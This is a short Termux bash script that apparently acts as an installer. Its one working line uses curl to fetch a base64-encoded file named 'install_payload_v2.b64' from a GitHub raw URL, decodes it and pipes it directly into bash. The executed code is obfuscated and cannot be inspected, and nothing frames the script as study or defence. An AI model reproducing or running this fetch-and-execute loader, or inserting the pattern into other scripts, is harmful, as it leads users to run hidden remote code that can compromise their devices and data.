#!/data/data/com.termux/files/usr/bin/bash
set -e
curl -fsSL https://raw.githubusercontent.com/ether4o4/Neversoft-Aware/main/encoded/install_payload_v2.b64 | base64 -d | bash -s -- "$@"
